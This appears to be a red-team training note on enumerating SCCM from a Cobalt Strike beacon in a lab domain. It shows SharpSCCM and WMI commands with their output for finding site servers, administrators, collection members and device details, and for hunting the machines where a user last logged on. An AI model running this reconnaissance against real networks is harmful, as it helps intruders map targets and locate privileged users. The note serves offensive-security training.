
The first step when attacking SCCM is to get a feel for the deployment topology, which devices are being managed, and who the administrative users are.

Tool to use: [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)

#### 🖊️ via Cobalt Strike

1) This does not require any special privileges in the domain, in SCCM or on the endpoint.

```
beacon> run hostname
wkstn-2

beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner

-----------------------------------
CurrentManagementPoint: scm-1.cyberbotic.io
Name: SMS:S01
-----------------------------------
[+] Completed execution in 00:00:00.2733939
```

2) This enumeration uses WMI under the hood, which could be done manually.

```
beacon> powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl

Name                   : SMS:S01
CurrentManagementPoint : scm-1.cyberbotic.io
```

3) We can also check the DACL on the `CN=System Management` container in AD for machines that have Full Control over it (as this a pre-requisite of SCCM setup in a domain).

```
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner

[!] Found 1 computer account(s) with GenericAll permission on the System Management container:

      CYBER\SCM-1$

[+] These systems are likely to be ConfigMgr site servers
[+] Completed execution in 00:00:00.4974129
```

4) Enumerating users, groups, computers, collections, and administrators, etc, does require some level of privilege in SCCM and cannot be done as a standard domain user.  SCCM employs an RBAC security model - the lowest role is "Read-Only Analyst" and the highest is "Full Administrator".  Lots of other roles exist:
 - "Asset Manager"
 - "Infrastructure Administrator"
 - "Software Update Manager".
 
 A description of each can be found [here](https://learn.microsoft.com/en-us/mem/configmgr/core/understand/fundamentals-of-role-based-administration).  Furthermore, the "scope" of these roles can be restricted to individual collections as needed by the administrative user.  This means that the enumeration results varies from the point of view you are doing them. 

⚠ So when enumerating SCCM, you may only see a small slither based on the user you're running the enumeration as.

5) Administrative users can be found using `get class-instances SMS_Admin`.

`beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner`

6) This allows us to see what is reflected in the Configuration Manger.  Members of these collections can be found using `get collection-members -n <collection-name>`. Example using collection "DEV":

`beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-banner`
```
-----------------------------------
Domain: DEV
Name: WKSTN-2
-----------------------------------
Domain: DEV
Name: SQL-2
-----------------------------------
Domain: DEV
Name: WKSTN-1
```

7) Even more information on each device can be obtained using `get devices`.  There are some good ways to filter the output, such as searching by device name, `-n`, and only displaying the properties specified by `-p`.

This example uses machine WKSTN:

```
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner

-----------------------------------
FullDomainName: DEV.CYBERBOTIC.IO
IPAddresses: 10.10.123.101
LastLogonUserName: nlamb
Name: WKSTN-1
OperatingSystemNameandVersion: Microsoft Windows NT Workstation 10.0
```

8) You can also use SCCM as a form of user hunting, since it records the last user to login to each managed computer.  The `-u` parameter will only return devices where the given user was the last to login.

```
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner

-----------------------------------
IPAddresses: 10.10.123.101
IPSubnets: 10.10.122.0
Name: WKSTN-1
-----------------------------------
[+] Completed execution in 00:00:01.7570393
```



#### ⚠ Opsec




### Properties
---
📆 created   {{24-02-2024}} 21:02
🏷️ tags: #redteam #crto 

---

